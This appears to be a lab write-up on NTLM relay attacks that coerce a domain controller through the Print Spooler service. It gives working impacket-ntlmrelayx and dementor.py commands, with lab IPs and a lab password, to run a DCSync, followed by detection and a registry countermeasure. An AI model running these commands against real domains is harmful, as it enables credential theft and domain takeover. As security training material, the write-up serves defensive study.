# NTLM relay is a technique where an attacker:

Tricks a victim into authenticating to the attacker </br>
Captures the NTLM authentication challenge/response </br>
Forwards (“relays”) that authentication to another server </br>
Authenticates as the victim without knowing the password </br>

The attacker does not crack the hash.</br>

They simply forward the authentication in real time.

<img width="1097" height="158" alt="image" src="https://github.com/user-attachments/assets/663d41ab-7b1d-4705-8e4c-e33e0f923133" />

# Printer Spooler–based coercion attacks

If registry setting (RegisterSpoolerRemoteRpcEndPoint 1) , it is opened. That can lead to attack

<img width="785" height="361" alt="image" src="https://github.com/user-attachments/assets/41627266-4116-468b-b2f9-70692510df0c" />

## First, configure NTLMRelayx to forward connections to DC2(172.16.18.4) and attempt the DCSync attack. It was listening

```
impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
```

## To trigger the connection back, we'll use Dementor. (dementor.py), 172.16.18.20 (attacker server), 172.16.18.3 (target machine)

```
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```
<img width="997" height="442" alt="image" src="https://github.com/user-attachments/assets/460501f4-4491-4a27-9860-ba681beb7c6b" />

## Returning to the terminal session with NTLMRelayx, we can see that the DCSync attack was successful.

<img width="953" height="418" alt="image" src="https://github.com/user-attachments/assets/b5381bf2-8258-4113-8707-397496a42a08" />

# Detect 

## Event ID 4624

<img width="701" height="707" alt="image" src="https://github.com/user-attachments/assets/abf75f0a-3860-4044-b465-09ed8cc697db" />

# Counter Measure

## Let’s connect to DC1 (172.16.18.3), open Registry Editior and disable the registry key **RegisterSpoolerRemoteRpcEndPoint**
### Default registry key

<img width="1157" height="196" alt="image" src="https://github.com/user-attachments/assets/f118c8f0-8697-4378-ab19-0df5a31ef641" />


## Disable registry key (modify into 2)

<img width="1105" height="202" alt="image" src="https://github.com/user-attachments/assets/caae0430-f847-497c-986d-7f07dff85497" />

## Now let's restart DC1 and try the attack again.

<img width="1142" height="127" alt="image" src="https://github.com/user-attachments/assets/f46595f9-6b6b-4fa1-b4ce-1b0039efde2f" />

